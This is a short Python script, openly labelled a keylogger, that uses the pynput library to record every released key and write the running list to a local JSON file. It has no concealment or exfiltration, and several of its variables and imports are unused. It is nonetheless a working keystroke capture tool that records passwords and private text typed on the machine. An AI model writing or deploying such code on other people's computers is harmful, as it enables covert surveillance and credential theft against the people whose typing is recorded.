import json
import os
import time
from pynput import keyboard

# Specify the path for the log file
log_file_path = "keylog_data.json"

# Initialize the data structure to store keystrokes
data = {"keystrokes": []}

# Dictionary to store the last time each key was logged
last_key_time = {}
debounce_time = 0.5  # Time in seconds before a key can be logged again
key_pressed = {}  # Dictionary to track the state of each key

def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    # Reset the key state when the key is released
    # key_pressed[key_str] = False
    data["keystrokes"].append(key_str)

    # Save the updated data to the JSON file
    with open(log_file_path, 'w') as f:
        json.dump(data, f, indent=0)

# Start the keylogger
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
